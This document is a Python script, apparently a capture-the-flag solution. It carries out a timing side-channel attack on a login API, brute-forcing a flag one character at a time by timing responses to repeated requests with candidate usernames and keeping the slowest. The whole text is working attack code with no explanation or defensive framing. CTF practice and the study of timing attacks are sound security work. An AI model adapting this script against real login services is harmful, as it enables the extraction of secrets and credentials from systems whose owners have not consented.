import requests
import time
import statistics
import string

URL = "https://login-ctf.forestylab.com/api/v1/login"

# Adjust if needed, but most CTF flags use these characters.
ALPHABET = string.ascii_letters + string.digits + "_{}-"

session = requests.Session()

def request_time(username):
    start = time.perf_counter()
    r = session.post(
        URL,
        json={
            "username": username,
            "password": "anything"
        },
        timeout=15
    )
    r.text
    return time.perf_counter() - start

def median_time(username, trials=4):
    times = []
    for _ in range(trials):
        times.append(request_time(username))
    return statistics.median(times)

prefix = "FORESTY{"

while not prefix.endswith("}"):
    scores = []

    print(f"\n[+] Current prefix: {prefix}")

    for ch in ALPHABET:
        candidate = prefix + ch
        t = median_time(candidate, trials=3)
        scores.append((t, ch))
        print(f"{candidate!r}: {t:.3f}s")

    scores.sort(reverse=True)

    best_time, best_char = scores[0]
    second_time, second_char = scores[1]

    # Re-check top candidates to reduce random sleep noise.
    top_chars = [ch for _, ch in scores[:5]]
    confirm = []

    print("\n[+] Confirming top candidates...")
    for ch in top_chars:
        candidate = prefix + ch
        t = median_time(candidate, trials=6)
        confirm.append((t, ch))
        print(f"{candidate!r}: {t:.3f}s")

    confirm.sort(reverse=True)
    best_time, best_char = confirm[0]

    prefix += best_char
    print(f"[+] Best char: {best_char!r}")
    print(f"[+] New prefix: {prefix}")

print(f"\nFLAG: {prefix}")
